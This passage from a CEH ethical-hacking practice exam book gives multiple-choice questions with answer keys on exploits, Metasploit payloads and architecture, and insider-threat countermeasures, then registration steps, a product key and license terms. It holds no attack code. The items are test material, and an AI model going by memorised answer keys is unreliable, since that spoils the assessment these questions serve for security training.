☐✗ C is incorrect because an exploit is what is or actually can be done by a threat agent
to utilize the vulnerability. Exploits can be local or remote, a piece of software, a series
of commands, or anything that actually uses the vulnerability to gain access to, or
otherwise affect, the target.

☐✗ D is incorrect because a zero-day exploit is simply an exploit that most of us don’t
really know much about at the time of its use. For instance, a couple years back some
bad guys discovered a flaw in Adobe Reader and developed an exploit for it. From the
time the exploit was created to the time Adobe finally recognized its existence and
built a fix action to mitigate against it, the exploit was referred to as zero day.

21. Which Metasploit payload type operates via DLL injection and is difficult for antivirus
software to pick up?

A. Inline

B. Meterpreter

C. Staged

D. Remote

CEH Certified Ethical Hacker Practice Exams

326

13-ch13.indd 326 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

☑ B. For those of you panicking over this question, relax. You do not have to know
all the inner workings of Metasploit, but it does appear enough—in the variety of
study materials available for CEH certification—that EC-Council wants you to know
some basics, and this question falls in that category. There are a bunch of different
payload types within Metasploit, and meterpreter (short for meta-interpreter) is one
of them. The following is from Metasploit’s website: “Meterpreter is an advanced
payload that is included in the Metasploit Framework. Its purpose is to provide
complex and advanced features that would otherwise be tedious to implement purely
in assembly. The way that it accomplishes this is by allowing developers to write their
own extensions in the form of shared object (DLL) files that can be uploaded and
injected into a running process on a target computer after exploitation has occurred.
Meterpreter and all of the extensions that it loads are executed entirely from memory
and never touch the disk, thus allowing them to execute under the radar of standard
anti-virus detection.”

☐✗ A is incorrect because inline payloads are single payloads that contain the full exploit
and shell code for the designed task. They may be more stable than other payloads, but
they’re easier to detect and, because of their size, may not be viable for many attacks.

☐✗ C is incorrect because staged payloads establish a connection between the attacking
machine and the victim. Once the connection is established, the payload is revisited
to execute on the remote machine.

☐✗ D is incorrect because “remote” isn’t a recognized payload type.

22. Metasploit is a framework allowing for the development and execution of exploit code
against a remote host and is designed for use in pen testing. The framework consists of
several libraries, each performing a specific task and set of functions. Which library is
considered the most fundamental component of the Metasploit framework?

A. MSF Core

B. MSF Base

C. MSF interfaces

D. Rex

☑ D. Once again, this is another one of those weird questions you may see (involving
any of the framework components) on your exam. It’s included here so you’re not
caught off guard in the actual exam room and freak out over not hearing it before.
Don’t worry about learning all the nuances of Metasploit and its architecture before
the exam—just concentrate on memorizing the basics of the framework (key words
for each area will assist with this), and you’ll be fine.

Metasploit, as you know, is an open source framework allowing a variety of
automated (point-and-shoot) pen test methods. The framework is designed in a
modular fashion, with each library and component responsible for its own function.
The following is from Metasploit’s development guide (you can find copies in a

Chapter 13: The Pen Test: Putting It All Together

327

13-ch13.indd 327 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

variety of places now; just use a Google search for msf_dev_guide filetype:pdf ):
“The most fundamental piece of the architecture is the Rex library, which is short
for the Ruby Extension Library. Some of the components provided by Rex include a
wrapper socket subsystem, implementations of protocol clients and servers, a logging
subsystem, exploitation utility classes, and a number of other useful classes.” Rex
provides critical services to the entire framework.

☐✗ A is incorrect because the MSF Core “is responsible for implementing all of the
required interfaces that allow for interacting with exploit modules, sessions, and
plugins.” It interfaces directly with Rex.

☐✗ B is incorrect because the MSF Base “is designed to provide simpler wrapper routines
for dealing with the framework core as well as providing utility classes for dealing
with different aspects of the framework, such as serializing module state to different
output formats.” The Base is an extension of the Core.

☐✗ C is incorrect because the MSF interfaces are the means by which you (the user)
interact with the framework. Interfaces for Metasploit include Console, CLI, Web,
and GUI.

23. Which of the following may be effective countermeasures against an inside attacker?
(Choose all that apply.)

A. Enforce elevated privilege control.

B. Secure all dumpsters and shred collection boxes.

C. Enforce good physical security practice and policy.

D. Perform background checks on all employees.

☑ A, B, C, D. All of the answers are correct. Admittedly, there’s nothing you can really
do to completely prevent an inside attack. There’s simply no way to ensure every
single employee is going to remain happy and satisfied, just as there’s no way to tell
when somebody might just up and decide to turn to crime. It happens all the time,
in and out of corporate America, so the best you can do is, of course, the best you
can do.

Enforcing elevated privilege control (that is, ensuring users have only the amount
of access, rights, and privileges to get their job done, and no more) seems like a
commonsense thing, but it’s amazing how many enterprise networks simply ignore
this. After all, a disgruntled employee with administrator rights on his machine can
certainly do more damage than one with just plain user rights. Securing dumpsters
and practicing good physical security should help protect against an insider who wants
to come back after hours and snoop around. And performing background checks
on employees, although by no means a silver bullet in this situation, can certainly

CEH Certified Ethical Hacker Practice Exams

328

13-ch13.indd 328 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13

help to ensure you’re hiring the right people in the first place (in many companies a
background check is a requirement of law). Here are some of the other steps:

• Monitor user network behavior.

• Monitor user computer behavior.

• Disable remote access.

• Disable removable drive use on all systems (USB drives and so on).

• Shred all discarded paperwork.

• Conduct user education and training programs.

Chapter 13: The Pen Test: Putting It All Together

329

13-ch13.indd 329 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 13/ Blind Folio: 330

This page intentionally left blank

13-ch13.indd 330 22/04/22 5:11 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Appendix

APPENDIX

About the Online Content

This book comes complete with TotalTester Online customizable practice exam software contain-
ing 250 practice exam questions.

System Requirements
The current and previous major versions of the following desktop browsers are recommended and
supported: Chrome, Microsoft Edge, Firefox, and Safari. These browsers update frequently, and
sometimes an update may cause compatibility issues with the TotalTester Online or other content
hosted on the Training Hub. If you run into a problem using one of these browsers, please try
using another until the problem is resolved.

Your Total Seminars Training Hub Account
To get access to the online content you will need to create an account on the Total Seminars
Training Hub. Registration is free, and you will be able to track all your online content using your
account. You may also opt in if you wish to receive marketing information from McGraw Hill or
Total Seminars, but this is not required for you to gain access to the online content.

Privacy Notice
McGraw Hill values your privacy. Please be sure to read the Privacy Notice available during regis-
tration to see how the information you have provided will be used. You may view our Corporate
Customer Privacy Policy by visiting the McGraw Hill Privacy Center. Visit the mheducation.com
site and click Privacy at the bottom of the page.

Single User License Terms and Conditions
Online access to the digital content included with this book is governed by the McGraw Hill License
Agreement outlined next. By using this digital content you agree to the terms of that license.

331

14-Appendix.indd 331 22/04/22 5:13 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Appendix

Access To register and activate your Total Seminars Training Hub account, simply follow these
easy steps:

1. Go to this URL: hub.totalsem.com/mheclaim

2. To register and create a new Training Hub account, enter your e-mail address, name,
and password on the Register tab. No further personal information (such as credit card
number) is required to create an account.

If you already have a Total Seminars Training Hub account, enter your e-mail address and
password on the Log in tab.

3. Enter your Product Key: k00c-tr9j-5wwc

4. Click to accept the user license terms.

5. For new users, click the Register and Claim button to create your account. For existing
users, click the Log in and Claim button.

You will be taken to the Training Hub and have access to the content for this book.

Duration of License Access to your online content through the Total Seminars Training Hub
will expire one year from the date the publisher declares the book out of print.

Your purchase of this McGraw Hill product, including its access code, through a retail store is
subject to the refund policy of that store.

The Content is a copyrighted work of McGraw Hill, and McGraw Hill reserves all rights in
and to the Content. The Work is © 2022 by McGraw Hill.

Restrictions on Transfer The user is receiving only a limited right to use the Content for
the user’s own internal and personal use, dependent on purchase and continued ownership of this
book. The user may not reproduce, forward, modify, create derivative works based upon, trans-
mit, distribute, disseminate, sell, publish, or sublicense the Content or in any way commingle the
Content with other third-party content without McGraw Hill’s consent.

Limited Warranty The McGraw Hill Content is provided on an “as is” basis. Neither Mc-
Graw Hill nor its licensors make any guarantees or warranties of any kind, either express or
implied, including, but not limited to, implied warranties of merchantability or fitness for a
particular purpose or use as to any McGraw Hill Content or the information therein or any war-
ranties as to the accuracy, completeness, correctness, or results to be obtained from, accessing or
using the McGraw Hill Content, or any material referenced in such Content or any information
entered into licensee’s product by users or other persons and/or any material available on or that
can be accessed through the licensee’s product (including via any hyperlink or otherwise) or as to
non-infringement of third-party rights. Any warranties of any kind, whether express or implied,
are disclaimed. Any material or data obtained through use of the McGraw Hill Content is at your
own discretion and risk and user understands that it will be solely responsible for any resulting
damage to its computer system or loss of data.

CEH Certified Ethical Hacker Practice Exams

332

14-Appendix.indd 332 22/04/22 5:13 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Appendix

Neither McGraw Hill nor its licensors shall be liable to any subscriber or to any user or anyone
else for any inaccuracy, delay, interruption in service, error or omission, regardless of cause, or for
any damage resulting therefrom.

In no event will McGraw Hill or its licensors be liable for any indirect, special or consequential
damages, including but not limited to, lost time, lost money, lost profits or good will, whether
in contract, tort, strict liability or otherwise, and whether or not such damages are foreseen or
unforeseen with respect to any use of the McGraw Hill Content.

TotalTester Online
TotalTester Online provides you with a simulation of the CEH v11 exam. Exams can be taken
in Practice Mode or Exam Mode. Practice Mode provides an assistance window with hints, refer-
ences to the book, explanations of the correct and incorrect answers, and the option to check your
answer as you take the test. Exam Mode provides a simulation of the actual exam. The number of
questions, the types of questions, and the time allowed are intended to be an accurate representa-
tion of the exam environment. The option to customize your quiz allows you to create custom
exams from selected domains or chapters, and you can further customize the number of questions
and time allowed.

To take a test, follow the instructions provided in the previous section to register and activate
your Total Seminars Training Hub account. When you register, you will be taken to the Total
Seminars Training Hub. From the Training Hub Home page, select your certification from the
Study drop-down menu at the top of the page to drill down to the TotalTester for your book. You
can also scroll to it from the list of Your Topics on the Home page, and then click the TotalTester
link to launch the TotalTester. Once you’ve launched your TotalTester, you can select the option
to customize your quiz and begin testing yourself in Practice Mode or Exam Mode. All exams
provide an overall grade and a grade broken down by domain.

Technical Support
For questions regarding the Total Tester software or operation of the Training Hub, visit
www.totalsem.com or e-mail support@totalsem.com.

For questions regarding book content, visit www.mheducation.com/customerservice.

Appendix: About the Online Content

333

14-Appendix.indd 333 22/04/22 5:13 PM